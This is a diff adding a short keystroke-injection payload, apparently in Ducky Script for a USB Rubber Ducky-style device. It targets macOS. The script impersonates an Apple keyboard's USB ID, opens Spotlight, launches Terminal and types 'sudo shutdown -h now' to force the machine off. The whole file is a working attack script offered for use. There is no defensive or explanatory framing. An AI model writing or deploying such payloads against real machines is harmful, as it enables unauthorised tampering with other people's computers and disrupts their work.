@@ -1,0 +1,11 @@
+ID 05ac:021e Apple:Keyboard
+REM Author: Matt6616
+REM Target: macOS
+DELAY 1000
+GUI SPACE
+DELAY 200
+STRING Terminal
+ENTER
+DELAY 1000
+STRING sudo shutdown -h now
+ENTER
